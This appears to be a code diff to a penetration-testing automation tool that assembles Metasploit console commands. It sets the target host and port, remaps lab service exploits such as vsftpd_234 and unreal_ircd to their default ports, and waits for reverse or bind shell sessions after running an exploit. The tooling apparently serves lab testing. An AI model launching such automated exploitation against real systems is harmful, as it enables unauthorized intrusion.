@@ -273,9 +273,10 @@ def _msfconsole_command(
 ) -> str:
     """Build msfconsole -x. Never chain local privesc here — only after a live session."""
     del followup_module  # kept for call-site compat; chaining is forbidden
+    rport = resolve_msf_rport(module, port)
     statements = [f"use {module}", f"set RHOSTS {ip}"]
-    if port:
-        statements.append(f"set RPORT {port}")
+    if rport:
+        statements.append(f"set RPORT {rport}")
     lhost = os.environ.get("AUTOPLAN_LHOST", "").strip()
     if lhost:
         statements.append(f"set LHOST {lhost}")
@@ -291,6 +292,10 @@ def _msfconsole_command(
         statements.append("set HttpClientTimeout 120")
     if for_auto_exploit:
         statements.append("run")
+        # Bind/reverse shells show up a few seconds after run; exit immediately
+        # drops the handler before "session opened" hits stdout.
+        if not _is_wordpress_msf_module(module):
+            statements.append("sleep 15")
         statements.append("exit")
     elif not skip_wpcheck:
         statements.append("check")
@@ -298,6 +303,25 @@ def _msfconsole_command(
     if for_auto_exploit:
         return f"msfconsole -q -x {shlex.quote(script)}"
     return f"msfconsole -q -x {shlex.quote(script)} # run manually after review"
+
+
+_HTTP_PORTS = frozenset({80, 443, 8000, 8080, 8180, 8443})
+_MODULE_RPORTS = (
+    ("vsftpd_234", 21),
+    ("usermap_script", 139),
+    ("unreal_ircd", 6667),
+)
+
+
+def resolve_msf_rport(module: str, port: int | None) -> int | None:
+    """Keep service exploits on their lab port when the draft copied HTTP :80."""
+    lowered = module.lower()
+    for marker, default in _MODULE_RPORTS:
+        if marker in lowered:
+            if port is None or port in _HTTP_PORTS:
+                return default
+            return port
+    return port
 
 
 def _is_web_msf_module(module: str) -> bool:
